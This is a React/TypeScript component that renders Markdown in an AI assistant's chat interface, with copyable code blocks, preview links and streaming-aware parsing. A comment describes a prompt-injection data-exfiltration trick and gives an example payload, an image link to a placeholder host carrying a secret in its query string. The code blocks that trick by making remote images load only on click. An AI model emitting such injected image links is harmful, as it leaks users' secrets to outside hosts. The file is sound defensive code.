// Markdown with highlighted, copyable code blocks and find-in-chat marks. Ported from the prototype. Single newlines
// are kept as line breaks, since replies often put one item per line. Links open in the preview pane, never in the
// app's own window (previewContext.tsx).
import { Children, Fragment, isValidElement, memo, useMemo, useRef, useState, type ReactNode } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import { Check, Copy, Image as ImageIcon } from "lucide-react";
import { PreviewLink } from "./previewContext";
import { splitBlocks, type Blocks } from "./markdownBlocks";
import { rehypePlugins, remarkPlugins } from "./markdownPipeline";

/** The language a highlighted `<code>` element names in its class, `language-ts`, or "" for none. */
function codeLanguage(children: ReactNode): string {
  const code = Children.toArray(children).find(isValidElement) as { props: { className?: unknown } } | undefined;
  const className = code?.props.className;
  return (typeof className === "string" && className.match(/language-(\S+)/)?.[1]) || "";
}

function CodeBlock({ children }: { children?: ReactNode }) {
  const ref = useRef<HTMLPreElement>(null);
  const [copied, setCopied] = useState(false);
  return (
    <div className="code">
      <div className="code-head">
        <span>{codeLanguage(children)}</span>
        <button
          className="code-copy"
          onClick={() => {
            void navigator.clipboard.writeText(ref.current?.innerText ?? "");
            setCopied(true);
            setTimeout(() => setCopied(false), 1200);
          }}
        >
          {copied ? <Check size={13} /> : <Copy size={13} />}
          {copied ? "Copied" : "Copy"}
        </button>
      </div>
      <pre ref={ref}>{children}</pre>
    </div>
  );
}

/**
 * An image in Markdown. Hermes's replies carry text it read from web pages, files and tool output, so a prompt injection
 * can ask for `![](https://host/?d=<secret>)`, and loading it would send the secret there. A source on the network is
 * shown as its host and loads only on a click, which never also follows a link around it (ADR 0099). react-markdown has
 * already emptied `data:` and other sources it doesn't allow.
 */
function MarkdownImage({ src, alt, title }: { src?: string; alt?: string; title?: string }) {
  const [load, setLoad] = useState(false);
  if (!src || load) return <img src={src || undefined} alt={alt} title={title} />;
  let host = src;
  try {
    host = new URL(src, location.href).host || src;
  } catch {}
  return (
    <button
      type="button"
      className="md-image"
      title={src}
      onClick={(e) => {
        e.preventDefault();
        e.stopPropagation();
        setLoad(true);
      }}
    >
      <ImageIcon size={13} />
      {alt ? `${alt}: image` : "Image"} from {host}, click to load
    </button>
  );
}

// Made once, not on each render: a new `pre` function would be a new component type to React, which would throw away
// every code block's DOM and build it again on each streamed delta (#224).
const components: Components = {
  pre: ({ children }) => <CodeBlock>{children}</CodeBlock>,
  a: ({ href, title, children }) => (
    <PreviewLink href={href} title={title}>
      {children}
    </PreviewLink>
  ),
  img: ({ src, alt, title }) => <MarkdownImage src={typeof src === "string" ? src : undefined} alt={alt} title={title} />,
};

/**
 * One piece of Markdown, rendered again only when its text, the find-in-chat query, or whether it is still growing
 * changes. `growing`: it is the end of a reply still streaming in, and ends in code that isn't finished, which stays
 * plain until it is.
 */
const Part = memo(function Part({ text, query, growing }: { text: string; query: string; growing: boolean }) {
  const plugins = useMemo(() => rehypePlugins(query, growing ? text : undefined), [query, growing, text]);
  return (
    <ReactMarkdown remarkPlugins={remarkPlugins} rehypePlugins={plugins} components={components}>
      {text}
    </ReactMarkdown>
  );
});

/**
 * `query`: the find-in-chat text to mark. `streaming`: the text is a reply still coming in, a delta at a time. From then
 * on, for as long as it stays on screen, it renders a top-level block at a time, so a delta parses only the last block
 * again, not every block before it, and code still coming in is highlighted once it is finished (ADR 0068). Once
 * finished, it comes out as the text rendered in one piece would.
 */
export const Markdown = memo(function Markdown({ text, query = "", streaming = false }: { text: string; query?: string; streaming?: boolean }) {
  const streamed = useRef(false);
  const split = useRef<Blocks | undefined>(undefined);
  streamed.current ||= streaming;
  if (!streamed.current) return <Part text={text} query={query} growing={false} />;
  // A cache of the last split, so each delta parses only from the last blocks on; the same text gives the same blocks.
  const blocks = (split.current = splitBlocks(text, split.current));
  if (blocks.whole) return <Part text={text} query={query} growing={streaming && !!blocks.blocks[blocks.blocks.length - 1]?.open} />;
  const last = blocks.blocks.length - 1;
  // A "\n" between blocks, as between the top-level elements of the text rendered in one piece.
  return blocks.blocks.map((b, i) => (
    <Fragment key={i}>
      {i > 0 && "\n"}
      <Part text={b.text} query={query} growing={streaming && i === last && b.open} />
    </Fragment>
  ));
});
